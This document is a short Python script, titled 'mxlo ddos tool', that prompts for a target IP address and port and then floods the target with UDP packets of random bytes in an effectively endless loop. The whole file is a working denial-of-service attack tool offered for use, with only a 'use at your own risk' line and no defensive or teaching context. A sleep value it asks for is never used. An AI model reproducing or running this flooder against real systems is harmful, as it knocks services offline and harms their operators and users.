import socket, random, time
from pyfiglet import figlet_format
from termcolor import colored

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ascii_art = figlet_format("mxlo ddos tool", font='slant')

colored_ascii = colored(ascii_art, 'red')
print(ascii_art)

print()
print("Use this at your own risk 				Cod3d by mxlo")
print()

ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))
 
s.connect((ip, port))
 
for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
